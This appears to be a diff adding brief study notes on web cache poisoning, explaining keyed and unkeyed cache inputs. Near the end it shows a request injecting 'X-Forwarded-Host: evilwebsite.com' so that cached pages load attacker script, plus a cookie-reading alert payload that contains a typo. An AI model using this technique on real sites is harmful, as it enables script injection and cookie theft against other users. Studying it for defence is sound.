@@ -1,0 +1,32 @@
+# how a cache key looks like:
+
+protocol|method|host|/path?key=value
+
+http[s]|GET|some-wbsite.com|/api/help?lang=en
+
+which are saved in cache key are known as keyed input and other are known as unkeyed inputs
+
+
+unkeyed inputs are for example: `token, referrer or user-agent`
+
+note: how to find cached part of the HTTP-request
+> Pragma: x-get-cache-key
+
+
+GET / HTTP/1.1
+Host: somewebsite.com
+>Pragma: x-get-cache-key
+...
+...
+
+-----------------------------
+
+GET / HTTP/1.1
+Host: somewebsite.com
+X-Forwarded-Host: evilwebsite.com
+...
+...
+
+evilwebsite.com/js/tracking.js
+
+alert(documetn.cookie)
